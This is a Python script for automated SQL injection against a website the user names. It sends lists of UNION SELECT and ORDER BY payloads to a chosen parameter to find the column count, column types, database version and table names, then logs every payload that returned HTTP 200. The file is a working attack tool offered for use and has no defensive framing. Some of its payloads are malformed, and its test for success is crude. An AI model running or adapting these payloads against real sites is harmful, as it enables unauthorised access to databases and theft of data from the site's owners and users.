#!/usr/bin/python3
import os
import requests as req
import urllib.parse
proxies = {"http": "http://127.0.0.1:8080"}
#making a function to read a file into a list
payloadstoexamindb=["'UNION SELECT NULL,banner FROM v$version --","'UNION SELECT NULL,version FROM v$instance -- ","'UNION SELECT NULL,version FROM v$instance -- ","'UNION SELECT * FROM version() -- ","'UNION  SELECT NULL,@@version FROM DUAL  --  ","'UNION SELECT  version() -- ","'UNION  SELECT * FROM  @@version --  ","'UNION SELECT NULL,banner FROM v$version # ","'UNION SELECT NULL,version FROM v$instance # ","'UNION SELECT NULL,version FROM v$instance # ","'UNION SELECT * FROM version() # ","'UNION  SELECT * FROM @@version #  ","'UNION SELECT  version() #","'UNION  SELECT NULL,'a'  @@version # "]
numofcolo=["'ORDER BY 1 #" ,"'ORDER BY 2 #" ,"'ORDER BY 3 #" ,"'ORDER BY 1 --" ,"'ORDER BY 2 --" ,"'ORDER BY 3 --" ]
definetype=[" 'UNION SELECT NULL,NULL--"," 'UNION SELECT NULL,'a'--"," 'UNION SELECT 'a',NULL--"," ' UNION  SELECT NULL FROM DUAL--"," ' UNION  SELECT NULL,NULL FROM DUAL--"," ' UNION  SELECT NULL FROM DUAL--"," ' UNION  SELECT NULL,'a' FROM DUAL-- "," ' UNION  SELECT 'a',NULL FROM DUAL--"," 'UNION SELECT NULL,NULL,'a'--"," 'UNION SELECT NULL,'a'--"," 'UNION SELECT 'a',NULL,NULL --"," 'UNION SELECT NULL,'a',NULL --"," ' UNION  SELECT NULL FROM DUAL--"," ' UNION  SELECT NULL,NULL FROM DUAL--"," ' UNION  SELECT NULL FROM DUAL--"," ' UNION  SELECT NULL,'a' FROM DUAL-- "," ' UNION  SELECT 'a',NULL FROM DUAL--","'UNION table_name,NULL SELECT FROM information_schema.tables--","'UNION NULL,table_name SELECT FROM information_schema.tables--","'UNION table_name,NULL SELECT FROM information_schema.tables #","'UNION NULL,table_name SELECT FROM information_schema.tables #",	"'UNION table_name,NULL SELECT FROM information_schema.tables--",	"'UNION NULL,table_name SELECT FROM information_schema.tables--",	"'UNION table_name,NULL,NULL SELECT FROM information_schema.tables--",	"'UNION NULL,table_name,NULL SELECT FROM information_schema.tables--",	"'UNION NULL,NULL,table_name SELECT FROM information_schema.tables--","'UNION table_name,NULL,NULL SELECT FROM information_schema.tables#",	"'UNION NULL,table_name,NULL SELECT FROM information_schema.tables#",	"'UNION NULL,NULL,table_name SELECT FROM information_schema.tables#","'UNION * SELECT FROM information_schema.tables--","'UNION NULL,NULL SELECT FROM version()--","'UNION TABLE_NAME,NULL SELECT FROM ALL_TABLES --","'UNION NULL,NULL SELECT FROM version()--","'UNION NULL,TABLE_NAME SELECT FROM ALL_TABLES--","'UNION NULL,banner SELECT FROM v$version--","'UNION banner,NULL SELECT FROM v$version--","'UNION NULL,NULL SELECT FROM --","'UNION NULL,NULL SELECT FROM #",	"'UNION version,NULL SELECT FROM v$instance--","'UNION NULL,version SELECT FROM v$instance--",	"'UNION NULL,NULL SELECT FROM DUAL --","'UNION NULL,NULL,NULL SELECT FROM --",	"'UNION TABLE_NAME,NULL,NULL SELECT FROM  DUAL--","'UNION NULL,TABLE_NAME SELECT FROM ALL_TABLES--","'UNION TABLE_NAME,NULL SELECT FROM ALL_TABLES--","'UNION NULL,NULL,NULL SELECT FROM #","'UNION NULL,TABLE_NAME,NULL SELECT FROM DUAL --","'UNION NULL,NULL,TABLE_NAME SELECT FROM DUAL --",	"'UNION NULL,NULL,NULL SELECT FROM #","'UNION banner,NULL,NULL SELECT FROM v$version--","'UNION NULL,banner,NULL SELECT FROM v$version--","'UNION NULL,NULL,banner SELECT FROM v$version--",]
url = input("Tell me what website do you want to make it ;) :")
para = input("Tell me what is the key of the paramter do you think its vuln:")
request_2=""
def testingforlive(url,para):
    request=str(req.get(url,proxies=proxies))
    output=open("output.txt",'w')
    output.write('this is the respons of the testing of live == '+request+'\n')
    output = open("output.txt")
    print(output.read())
    with open('output.txt') as f:
        if '<Response [200]>' in f.read():
            print("the recived code is 200 -- so its alive lets do it ...")
        else:
            while True:
                print("pls try to input the url correctly")
                break    
def numcolum (url,numofcolo):
    print("trying to know how many coloum are there...")            
    for numlist in numofcolo:
            finalnumlist={para:numlist}
            request_2= str(req.get(url,params=finalnumlist,proxies=proxies))
            if request_2 == "<Response [200]>":
                finalresult={numlist:request_2}
                print(finalresult)
                output_2=open("output.txt",'a')
                output_2.write('this this the payloads that make it with 200: '+numlist+'\n')
                output_2.close()
def definetypeofcolo(url,definetype):
        print("demetering to know what is the type of the coloums...")
        for typee in definetype:
            finalnumlist_2={para:typee}
            request_3= str(req.get(url,params=finalnumlist_2,proxies=proxies))
            if request_3 == "<Response [200]>":
                finalresult_2={typee:request_2}
                print(finalresult_2)
                output_3=open("output.txt",'a')
                output_3.write('this this the payloads that make it with 200 defing what is the type of the coloum: '+typee+'\n')
                output_3.close()
def examing(url,payloadstoexamindb):    
        print("demetering the db...")
        for exam in payloadstoexamindb:
            finalnumlist_3={para:exam}
            request_4= str(req.get(url,params=finalnumlist_3,proxies=proxies))
            if request_4 == "<Response [200]>":
                finalresult_3={exam:request_4}
                print(finalresult_3)
                output_4=open("output.txt",'a')
                output_4.write('this this the payloads that demret the db: '+exam+'\n')
                output_4.close()           
testingforlive(url,para)
numcolum(url,numofcolo) 
definetypeofcolo(url,definetype)
examing(url,payloadstoexamindb)
print("-----")
print("this is resurce for the db main tables")
print("-----")
print("for postgresql :https://www.postgresql.org/docs/9.3/infoschema-tables.html")
print("-----")
print("for mysql:https://dev.mysql.com/doc/refman/8.0/en/information-schema-table-reference.html \n some of payloads here can work in 'Microsoft' ")
print("-----")
print("for orcal : https://docs.oracle.com/cd/B19306_01/server.102/b14237/statviews_2105.htm#REFRN20286 ")
print("-----")
print("you want to make it manual check output.txt it will help you with your search")